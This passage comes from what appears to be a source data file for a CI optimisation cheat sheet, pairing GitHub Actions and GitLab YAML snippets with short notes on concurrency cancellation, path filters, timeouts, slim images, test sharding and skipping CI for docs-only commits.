          note: 'Key caches on lockfiles so they change only when dependencies change. The type=gha Docker cache needs the Buildx setup step, and pushing needs a docker/login-action@v3 step plus packages: write.',
        },
        {
          title: 'Cancel superseded runs',
          lang: 'yaml',
          code: c`
            concurrency:
              group: ${GH} github.workflow }}-${GH} github.ref }}
              cancel-in-progress: true
            `,
          note: 'A new push to the same branch or PR cancels the run still in progress. Use cancel-in-progress: false for deploy workflows so a deploy is never killed halfway.',
          then: [
            {
              label: 'GitLab',
              lang: 'yaml',
              code: c`
                default:
                  interruptible: true          # deploy jobs: set interruptible: false

                workflow:
                  auto_cancel:
                    on_new_commit: interruptible
                `,
            },
          ],
        },
        {
          title: 'Run only when relevant files change',
          lang: 'yaml',
          code: c`
            on:
              push:
                branches: [main]
                paths:
                  - 'src/**'
                  - 'package*.json'
                  - '.github/workflows/ci.yml'
              pull_request:
                paths-ignore:
                  - '**.md'
                  - 'docs/**'
            `,
          note: 'If a workflow skipped by a path filter provides a required status check, the PR waits forever; keep required checks in workflows that always run.',
          then: [
            {
              label: 'GitLab',
              lang: 'yaml',
              code: c`
                frontend-test:
                  script: npm test
                  rules:
                    - changes:
                        - frontend/**/*
                        - package-lock.json
                `,
            },
          ],
        },
        {
          title: 'Fail fast and cap run time',
          lang: 'yaml',
          code: c`
            jobs:
              test:
                runs-on: ubuntu-latest
                timeout-minutes: 15            # default is 360
                strategy:
                  fail-fast: true              # default: cancel other matrix jobs on first failure
                  matrix:
                    node: [22, 24]
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: ${GH} matrix.node }}
                      cache: npm
                  - run: npm ci
                  - run: npm test
                    timeout-minutes: 10        # per step too
            `,
          note: 'A hung test otherwise burns six hours of minutes. Run lint and type checks as a separate quick job so they fail in seconds.',
          then: [
            {
              label: 'GitLab',
              lang: 'yaml',
              code: c`
                test:
                  timeout: 15m
                  script: npm test
                `,
            },
          ],
        },
        {
          title: 'Use smaller images and shallow clones',
          lang: 'yaml',
          code: c`
            # GitLab
            variables:
              GIT_DEPTH: 10                # shallow clone (default is 20)

            test:
              image: node:24-slim          # far smaller than node:24
              script: npm test

            lint-python:
              image: python:3.12-slim
              script:
                - pip install ruff
                - ruff check .
            `,
          note: 'Slim images pull faster; alpine images are smaller still but can break packages with native code. actions/checkout@v4 already clones with depth 1 unless you set fetch-depth.',
        },
        {
          title: 'Split slow suites across parallel jobs',
          lang: 'yaml',
          code: c`
              e2e:
                runs-on: ubuntu-latest
                strategy:
                  fail-fast: false             # let every shard report its failures
                  matrix:
                    shard: [1, 2, 3, 4]
                steps:
                  - uses: actions/checkout@v4
                  - uses: actions/setup-node@v4
                    with:
                      node-version: 24
                      cache: npm
                  - run: npm ci
                  - run: npx playwright install --with-deps chromium
                  - run: npx playwright test --shard=${GH} matrix.shard }}/4
            `,
          note: 'Four shards finish in roughly a quarter of the time for the same total minutes. Jest and Vitest accept the same --shard=1/4 option.',
          then: [
            {
              label: 'GitLab',
              lang: 'yaml',
              code: c`
                e2e:
                  image: node:24
                  parallel: 4
                  script:
                    - npm ci
                    - npx playwright install --with-deps chromium
                    - npx playwright test --shard=$CI_NODE_INDEX/$CI_NODE_TOTAL
                `,
            },
          ],
        },
        {
          title: 'Skip CI for docs-only commits',
          lang: 'bash',
          code: c`
            # same on every OS
            git commit -m "docs: fix typo [skip ci]"     # skipped by GitHub Actions and GitLab
            git push -o ci.skip                          # GitLab only: skip without changing the message
            `,
          note: 'GitHub also accepts [ci skip], [no ci], [skip actions] and [actions skip] for push and pull_request runs. A skipped run reports no status, so a PR with required checks cannot merge until a later commit runs CI.',
        },
      ],
    },
  ],
}
